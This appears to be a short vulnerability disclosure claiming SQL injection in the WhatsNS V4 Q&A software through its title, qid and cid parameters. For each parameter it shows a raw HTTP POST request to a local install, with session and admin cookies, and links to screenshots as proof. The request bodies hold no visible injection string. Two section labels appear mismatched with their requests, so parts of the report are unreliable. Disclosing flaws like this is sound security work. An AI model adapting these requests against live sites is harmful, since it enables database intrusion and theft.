# WhatSNS V4 sqlinject

---

* Project official£ºhttps://www.whatsns.com
* project address:   https://gitee.com/huangyouzhi/whatsns

---

##1. $title variable
>URL:http://127.0.0.1/whatsns/index.php?question/add.html
![Alt text](/whatsns4.0/1/1.png)

* POST:
```
POST /whatsns/index.php?question/ajaxadd.html HTTP/1.1
Host: 127.0.0.1
Content-Length: 478
Accept: */*
Origin: http://127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://127.0.0.1/whatsns/index.php?question/add.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; admin_id=1; admin_level=1; admin_name=admin; admin_secret=64be56d4bf947233b17847aa1f92a6e0; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=voj344708qm3njkffetjlci4j2; whatsnssid=9401057a550e6bea; whatsnsauth=6e7bEgOIQKOCnuGn3WDIX0gi0DYzNU8GxBqisc02iIXYip5yulBey1QMRtdgKAJf6ybFFCZL1WB%2B%2FO0u42uo
Connection: close

title=%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A&description=%0A++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%3Cp%3E%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%3C%2Fp%3E%3Cp%3E%3Cbr%3E%3C%2Fp%3E&cid=24&cid1=24&cid2=0&cid3=0&tokenkey=a75a225c20fce4dbffadeef123504018&tags=&givescore=0&hidanswer=0&askfromuid=0
```
>verification:
![Alt text](/whatsns4.0/1/2.png)


## 2.$qid variable
>URL:http://127.0.0.1/whatsns/index.php?admin_category/default.html
![Alt text](/whatsns4.0/1/3.png)


* POST:

```
POST /whatsns/index.php?inform/add.html HTTP/1.1
Host: 127.0.0.1
Content-Length: 219
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/whatsns/index.php?q-5.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; admin_id=1; admin_level=1; admin_name=admin; admin_secret=64be56d4bf947233b17847aa1f92a6e0; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=voj344708qm3njkffetjlci4j2; whatsnsauth=6e7bEgOIQKOCnuGn3WDIX0gi0DYzNU8GxBqisc02iIXYip5yulBey1QMRtdgKAJf6ybFFCZL1WB%2B%2FO0u42uo; whatsnssid=a288c452ab70d4d5; whatsnslastrefresh=1
Connection: close

qid=5&aid=0&qtitle=Try+to+hack+the+world%2Cbelieve+yourself%2Cyour+heart+on+road%2Cyou+can+open+most+door+and+hit+god+windos+any+hit+her%2Cbecause+you+is+god.&type=5&content=%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A%E5%95%8A
```

> verification:
![Alt text](/whatsns4.0/1/4.png)

## 3.$cid variable
>URL£ºReport page
![Alt text](/whatsns4.0/1/5.png)

* POST:

```
POST /whatsns/index.php?admin_category/remove.html HTTP/1.1
Host: 127.0.0.1
Content-Length: 71
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/whatsns/index.php?admin_category/default.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; admin_id=1; admin_level=1; admin_name=admin; admin_secret=64be56d4bf947233b17847aa1f92a6e0; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=voj344708qm3njkffetjlci4j2; whatsnssid=0b1526df30d7edba; whatsnsauth=fdeezColjFh7ciI%2F2UGPzmDbewNKY%2FiMu0MD%2FUfbi2czoPFH%2FroAf5i9GGkULIdLO%2Bme23yvB8xVygFI%2BX1%2F; whatsnslastrefresh=1
Connection: close

hiddencid=0&cid%5B%5D=2&corder2=0&order%5B%5D=2&corder1=1&order%5B%5D=1
```

>verification:
![Alt text](/whatsns4.0/1/6.png)
